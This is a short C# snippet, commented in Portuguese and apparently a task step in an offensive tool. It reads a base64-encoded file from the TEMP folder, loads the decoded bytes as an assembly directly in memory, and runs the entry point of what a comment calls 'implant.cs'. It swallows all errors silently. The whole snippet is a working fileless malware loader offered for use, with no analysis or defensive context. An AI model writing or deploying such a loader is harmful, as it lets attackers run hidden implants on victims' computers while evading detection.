Task.Code:

    try {
        // Procura o arquivo .txt na pasta TEMP
        string path = Environment.GetEnvironmentVariable("TEMP") + @"\qpwoe64.txt";
        if (System.IO.File.Exists(path)) {
            string content = System.IO.File.ReadAllText(path).Trim();
            byte[] b = Convert.FromBase64String(content);
            // Carrega o binário diretamente na memória
            System.Reflection.Assembly a = System.Reflection.Assembly.Load(b);
            // Invoca o método Main(string[] args) do implant.cs
            a.EntryPoint.Invoke(null, new object[] { new string[] { } });
        }
    } catch (Exception e) { }
